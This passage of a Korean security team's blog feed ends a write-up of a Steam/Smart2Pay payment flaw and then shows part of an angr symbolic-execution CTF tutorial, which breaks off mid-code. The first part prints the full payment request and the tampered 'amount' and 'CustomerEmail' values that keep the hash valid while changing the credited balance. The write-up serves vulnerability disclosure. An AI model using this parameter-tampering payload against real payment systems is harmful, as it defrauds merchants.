&#xC2E4;&#xC81C; &#xC9C0;&#xBD88; &#xAE08;&#xC561;&#xBCF4;&#xB2E4; &#xB354; &#xB9CE;&#xC740; &#xC794;&#xC561;&#xC744; &#xCDA9;&#xC804;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: globalapi.smart<span class="hljs-number">2</span>pay.com<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">388</span><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><span class="hljs-attribute">Sec</span>-Ch-Ua: <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;92&quot;</span>, <span class="hljs-string">&quot; Not A;Brand&quot;</span>;v=<span class="hljs-string">&quot;99&quot;</span>, <span class="hljs-string">&quot;Google Chrome&quot;</span>;v=<span class="hljs-string">&quot;92&quot;</span><span class="hljs-attribute">Sec</span>-Ch-Ua-Mobile: ?<span class="hljs-number">0</span><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">Origin</span>: https://store.steampowered.com<span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">92</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4515</span>.<span class="hljs-number">131</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><span class="hljs-attribute">Sec</span>-Fetch-Site: cross-site<span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<span class="hljs-attribute">Referer</span>: https://store.steampowered.com/<span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Accept</span>-Language: pl-PL,pl;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">MerchantID</span>=<span class="hljs-number">1102</span>&amp;MerchantTransactionID=&#x2588;&#x2588;&#x2588;&amp;Amount=<span class="hljs-number">2000</span>&amp;Currency=PLN&amp;ReturnURL=https%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fstore.steampowered.com%<span class="hljs-number">2</span>Fpaypal%<span class="hljs-number">2</span>Fsmart<span class="hljs-number">2</span>pay%<span class="hljs-number">2</span>F&#x2588;&#x2588;&#x2588;&#x2588;%<span class="hljs-number">2</span>F&amp;MethodID=<span class="hljs-number">12</span>&amp;Country=PL&amp;CustomerEmail=brixamount<span class="hljs-number">100</span>abc%<span class="hljs-number">40</span>&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&amp;CustomerName=_drbrix_&amp;SkipHPP=<span class="hljs-number">1</span>&amp;Description=Steam+Purchase&amp;SkinID=<span class="hljs-number">101</span>&amp;Hash=&#x2588;&#x2588;&#x2588;</code></pre><p>POST &#xB9AC;&#xD018;&#xC2A4;&#xD2B8;&#xC758; Hash&#xAC12;&#xC740; &#x2018;=&#x2019;&#xB97C; &#xC81C;&#xC678;&#xD55C; &#xBAA8;&#xB4E0; &#xD544;&#xB4DC;&#xC758; &#xC774;&#xB984;&#xACFC; &#xAC12;&#xC744; &#xD558;&#xB098;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xD569;&#xCCD0;&#xC11C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574;  <code>amount</code>&#xC640;  <code>CustomerEmail</code> &#xD544;&#xB4DC;&#xB97C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC870;&#xC791;&#xD558;&#xBA74; Hash&#xAC12;&#xC740; &#xADF8;&#xB300;&#xB85C; &#xB454; &#xCC44;&#xB85C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><code>amount=2000</code>&#xB97C; <code>amount2=000</code>&#xC73C;&#xB85C; &#xC870;&#xC791;</li><li><code>CustomerEmail</code>&#xD544;&#xB4DC;&#xC640; &#xADF8; &#xAC12;&#xC744; <code>CustomerEmail=aaa&amp;amount=100&amp;ab=c%40bbb</code>&#xC73C;&#xB85C; &#xC870;&#xC791;</li></ul><p>&#xCDA9;&#xC804;&#xB420; &#xC794;&#xC561;&#xC744; &#xB73B;&#xD558;&#xB294; <code>amount</code>&#xD544;&#xB4DC;&#xB97C; &#xC6D0;&#xD558;&#xB294; &#xAC12;&#xC73C;&#xB85C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2E4;&#xC81C; &#xC9C0;&#xBD88; &#xAE08;&#xC561;&#xACFC; &#xCDA9;&#xC804;&#xB418;&#xB294; &#xC794;&#xC561;&#xC758; &#xCC28;&#xC774;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/post/">post</category>
      
      <category domain="https://hackyboiz.github.io/tags/parmeter-modify/">parmeter modify</category>
      
      <category domain="https://hackyboiz.github.io/tags/steam/">steam</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/16/fabu1ous/2021-08-16/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 핵린이의 angr 정복기 - (4) angr_ctf part.2</title>
      <link>https://hackyboiz.github.io/2021/08/15/j0ker/angr_part4/</link>
      <guid>https://hackyboiz.github.io/2021/08/15/j0ker/angr_part4/</guid>
      <pubDate>Sun, 15 Aug 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;&amp;#xD575;&amp;#xB9B0;&amp;#xC774;&amp;#xC758;-angr-&amp;#xC815;&amp;#xBCF5;&amp;#xAE30;-4-angr-ctf-part-2&quot;&gt;&lt;a href=&quot;#&amp;#xD575;&amp;#xB9B0;&amp;#xC774;&amp;#xC758;-angr-&amp;#</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="&#xD575;&#xB9B0;&#xC774;&#xC758;-angr-&#xC815;&#xBCF5;&#xAE30;-4-angr-ctf-part-2"><a href="#&#xD575;&#xB9B0;&#xC774;&#xC758;-angr-&#xC815;&#xBCF5;&#xAE30;-4-angr-ctf-part-2" class="headerlink" title="&#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (4) angr_ctf part.2"></a>&#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (4) angr_ctf part.2</h1><p><img src="/2021/08/15/j0ker/angr_part4/5jnh8a.jpg" alt="5jnh8a.jpg"></p><h1 id="&#xC774;&#xC804;-&#xAE00;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC774;&#xC804;-&#xAE00;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC774;&#xC804; &#xAE00; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC774;&#xC804; &#xAE00; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/07/10/j0ker/angr_part1/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (1) &#xC2DC;&#xC791;</a></p><p><a href="https://hackyboiz.github.io/2021/07/21/j0ker/angr_part2/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (2) Symbolic Execution</a></p><p><a href="https://hackyboiz.github.io/2021/08/04/j0ker/angr_part3/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (3) angr_ctf part.1</a></p><p>[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (4) angr_ctf part.2 &#x2190; Here!</p><h1 id="&#xC778;&#xC0AC;&#xB9D0;"><a href="#&#xC778;&#xC0AC;&#xB9D0;" class="headerlink" title="&#xC778;&#xC0AC;&#xB9D0;"></a>&#xC778;&#xC0AC;&#xB9D0;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. j0ker &#xC785;&#xB2C8;&#xB2E4;! &#xC774;&#xBC88;&#xC5D0;&#xB3C4; angr_ctf &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xD480;&#xC5B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xC2DC;&#xB9AC;&#xC988;&#xAC00; &#xB9E4;&#xC6B0; &#xAE38;&#xC5B4;&#xC9C8;&#xAC70; &#xAC19;&#xC740; &#xC608;&#xAC10;&#xC740; &#xD2C0;&#xB9AC;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;&#xB294;&#xAC70;&#x2026; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xC2DC;&#xB9AC;&#xC988;&#xAC00; &#xB354; &#xAE38;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xADF8;&#xB9AC;&#xACE0; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xB354; &#xACE0;&#xD1B5;&#xC2A4;&#xB7FD;&#x2026;. &#xD558;&#xD558;</p><h1 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h1><p>&#xC55E;&#xC5D0; 5&#xBC88; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xC804;&#xC5ED;&#xBCC0;&#xC218;&#xC5D0; &#xB300;&#xD55C; &#xC2EC;&#xBCFC;&#xC744; &#xC9C0;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC81C;&#xBAA9;&#xC5D0; &#xB2E4;&#xC774;&#xB098;&#xBBF9; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xB098;&#xC628;&#xAC83;&#xC744; &#xBCF4;&#xB2C8; &#xC790;&#xC5F0;&#xC2A4;&#xB7FD;&#xAC8C; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xD799;&#xC5D0; &#xC2EC;&#xBCFC;&#xC744; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xAD6C;&#xB098;&#xB77C;&#xACE0; &#xCD94;&#xCE21;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. &#xBC14;&#xB85C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xAE4C;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/15/j0ker/angr_part4/Untitled.png" alt="angr_part4/Untitled.png"></p><p>&#xC5ED;&#xC2DC; &#xD799;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xB450; &#xAC1C;&#xC758; &#xBCC0;&#xC218;&#xAC00; &#xD799;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC55E;&#xC5D0;&#xC11C;&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xACE0; &#xBD84;&#xC11D;&#xC740; scanf &#xB4A4;&#xC5D0;&#xC11C;&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD574;&#xC57C;&#xACA0;&#xB124;&#xC694;. &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xB4E4;&#xC5EC;&#xB2E4;&#xBCF4;&#xBA74; &#xC55E;&#xC5D0;&#xC11C; &#xC2A4;&#xD0DD;&#xAD00;&#xB828;&#xB41C; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5C8;&#xC744; &#xB54C;&#xC640; &#xAC19;&#xC774; angr&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xB54C; <code>malloc</code>&#xC758; &#xACB0;&#xACFC;&#xAC12;, &#xC989; &#xD799;&#xC774; &#xC5B4;&#xB514;&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xADF8; &#xC8FC;&#xC18C;&#xB97C; &#xBAA8;&#xB978;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xAC00;&#xC0C1;&#xC758; &#xD799; &#xC8FC;&#xC18C;&#xB97C; &#xC6B0;&#xB9AC;&#xAC00; &#xC784;&#xC758;&#xB85C; &#xC9C0;&#xC815;&#xC744; &#xD574;&#xC918;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">fake_heap_address0 = <span class="hljs-number">0x41414140</span>pointer_to_malloc_memory_address0 = <span class="hljs-number">0x0ABCC8A4</span>initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness)fake_heap_address1 = <span class="hljs-number">0x41414150</span>pointer_to_malloc_memory_address1 = <span class="hljs-number">0x0ABCC8AC</span>initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness)</code></pre><p>&#xAC01;&#xAC01; &#xBCC0;&#xC218;&#xC758; &#xD06C;&#xAE30;&#xAC00; 9&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; alignment&#xB85C; &#xC778;&#xD574; &#xC544;&#xB9C8; 16&#xBC14;&#xC774;&#xD2B8;&#xC529; &#xD560;&#xB2F9;&#xC774; &#xB420;&#xAC81;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; &#xC77C;&#xB2E8; 0x41414140&#xACFC; 0x41414150&#xC73C;&#xB85C; 16&#xBC14;&#xC774;&#xD2B8; &#xAC04;&#xACA9;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD574; &#xC8FC;&#xC5C8;&#xACE0; &#xD799; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xB294; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; &#xAC01;&#xAC01; <code>initial_state</code>&#xC5D0; &#xC124;&#xC815;&#xD574;&#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB9C8; &#xC8FC;&#xC18C;&#xB294; &#xB2E4;&#xB974;&#xAC8C; &#xBC14;&#xAFB8;&#xACE0; &#xAC04;&#xACA9;&#xB9CC; &#xC2E0;&#xACBD;&#xC4F0;&#xBA74; &#xD070; &#xBB38;&#xC81C;&#xB294; &#xC5C6;&#xC744; &#xB4EF; &#xC2BE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB978; &#xBD80;&#xBD84;&#xC740; &#xC55E; &#xBB38;&#xC81C;&#xB4E4;&#xACFC; &#xB611;&#xAC19;&#xB124;&#xC694;!</p><h2 id="sol06-py"><a href="#sol06-py" class="headerlink" title="sol06.py"></a>sol06.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = <span class="hljs-number">0x08048696</span>  initial_state = project.factory.blank_state(addr=start_address)  password0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, <span class="hljs-number">64</span>)  password1 = claripy.BVS(<span class="hljs-string">&apos;password1&apos;</span>, <span class="hljs-number">64</span>)    fake_heap_address0 = <span class="hljs-number">0x41414140</span>  pointer_to_malloc_memory_address0 = <span class="hljs-number">0x0ABCC8A4</span>  initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness)  fake_heap_address1 = <span class="hljs-number">0x41414150</span>  pointer_to_malloc_memory_address1 = <span class="hljs-number">0x0ABCC8AC</span>  initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness)    initial_state.memory.store(fake_heap_address0, password0)  initial_state.memory.store(fake_heap_address1, password1)    simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Good Job&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Try again&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0, cast_to=bytes)    solution1 = solution_state.se.eval(password1, cast_to=bytes)        solution = <span class="hljs-string">&apos;{} {}&apos;</span>.format(solution0, solution1)    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol06.py <span class="hljs-number">06</span>_angr_symbolic_dynamic_memory WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">145</span> | angr.storage.memory_mixins.bvv_conversion_mixin | Unknown size <span class="hljs-keyword">for</span> memory data <span class="hljs-number">0x41414140</span>. Default to arch.bits.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">145</span> | angr.storage.memory_mixins.bvv_conversion_mixin | Unknown size <span class="hljs-keyword">for</span> memory data <span class="hljs-number">0x41414150</span>. Default to arch.bits.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">150</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">150</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">150</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">150</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">150</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">150</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebp <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048699</span> (main+<span class="hljs-number">0x8d</span> <span class="hljs-keyword">in</span> <span class="hljs-number">06</span>_angr_symbolic_dynamic_memory (<span class="hljs-number">0x8048699</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">26</span>,<span class="hljs-number">815</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x41414148</span> <span class="hljs-keyword">with</span> <span class="hljs-number">8</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0xac8a520</span> (strncmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x8a520</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">26</span>,<span class="hljs-number">816</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x41414158</span> <span class="hljs-keyword">with</span> <span class="hljs-number">105</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0xac8a520</span> (strncmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x8a520</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">28</span>,<span class="hljs-number">576</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x414141c1</span> <span class="hljs-keyword">with</span> <span class="hljs-number">16</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0xac8a520</span> (strncmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x8a520</span>))CRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">30</span>,<span class="hljs-number">932</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.<span class="hljs-string">b&apos;UBDKLMBV&apos;</span> <span class="hljs-string">b&apos;UNOERNYS&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">06</span>_angr_symbolic_dynamic_memory Enter the password: UBDKLMBVUNOERNYSGood Job.j0ker@angr:~/angr_ctf/dist$</code></pre><h1 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h1><p>&#xC774;&#xC81C; &#xB2E4;&#xB4E4; &#xB208;&#xCE58; &#xCC44;&#xC2DC;&#xACA0;&#xC8E0;? &#xB108;&#xBB34; &#xBED4;&#xD558;&#xAC8C; &#xD30C;&#xC77C;&#xC744; &#xC2EC;&#xBCFC;&#xB85C; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xACA0;&#xB124;&#xC694; &#x314B;&#x314B; &#xD558;&#xD558; &#xC774;&#xCBE4;&#xB418;&#xBA74; &#xB208;&#xAC10;&#xACE0;&#xB3C4; &#xBB38;&#xC81C; &#xC720;&#xD615;&#xC740; &#xB9DE;&#xCD94;&#xC2E4; &#xC218; &#xC788;&#xC73C;&#xC2E4; &#xAC81;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/15/j0ker/angr_part4/Untitled1.png" alt="angr_part4/Untitled 1.png"></p><p>&#xC77C;&#xB2E8; &#xBA3C;&#xC800; 64&#xBC14;&#xC774;&#xD2B8; &#xC785;&#xB825;&#xAC12;&#xC744; &#xBC1B;&#xACE0; &#xD30C;&#xC77C;&#xC5D0; &#xC501;&#xB2C8;&#xB2E4;. &#xC911;&#xAC04;&#xC5D0; <code>ignore_me</code>&#xB77C;&#xB294; &#xD568;&#xC218;&#xAC00; &#xC788;&#xB294; &#xAC78; &#xBCF4;&#xB2C8; &#xC800; &#xD568;&#xC218; &#xB4A4;&#xBD80;&#xD130; &#xBD84;&#xC11D;&#xD558;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4;&#xBA74; &#xB420;&#xAC70; &#xAC19;&#xB124;&#xC694;. &#xADF8;&#xB9AC;&#xACE0; &#xD30C;&#xC77C;&#xC744; &#xC4F0;&#xACE0; &#xC9C0;&#xC6B4; &#xB2E4;&#xC74C; &#xADF8; &#xAC12;&#xC73C;&#xB85C; &#xBB54;&#xAC00; &#xD55C; &#xB2E4;&#xC74C;&#xC5D0; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;. &#xCC98;&#xC74C;&#xC5D0; &#xC0DD;&#xAC01;&#xD588;&#xB358;&#xAC70;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xBB38;&#xC81C;&#xCC98;&#xB7FC; <code>buffer</code> &#xC8FC;&#xC18C;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC; &#xC2EC;&#xBCFC;&#xB85C; &#xC9C0;&#xC815;&#xD558;&#xACE0; &#xD480;&#xAE4C;&#xD588;&#xB294;&#xB370;, &#xBB38;&#xC81C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xBCF4;&#xB2C8; &#xADF8;&#xB807;&#xAC8C; &#xD480; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xC81C;&#xBC1C; &#xBB38;&#xC81C; &#xC758;&#xB3C4;&#xC5D0; &#xB530;&#xB77C; &#xB2EC;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B; &#xADF8;&#xB7FC; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0; &#xB530;&#xB77C; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD569;&#xC2DC;&#xB2E4;. &#xC77C;&#xB2E8; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xACFC; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xAC70;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xAE4C;&#xBA74; &#xB2E4; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC8E0;?</p><p>&#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#xC774;&#xC81C; &#xD30C;&#xC77C;&#xC5D0; &#xC2EC;&#xBCFC;&#xC744; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">symbolic_file_backing_memory = angr.state_plugins.SimSymbolicMemory()symbolic_file_backing_memory.set_state(initial_state)password = claripy.BVS(<span class="hljs-string">&apos;password&apos;</span>, symbolic_file_size_bytes * <span class="hljs-number">8</span>)symbolic_file_backing_memory.store(address_of_buffer, password)file_options = <span class="hljs-string">&apos;r&apos;</span>password_file = angr.storage.SimFile(filename, file_options, 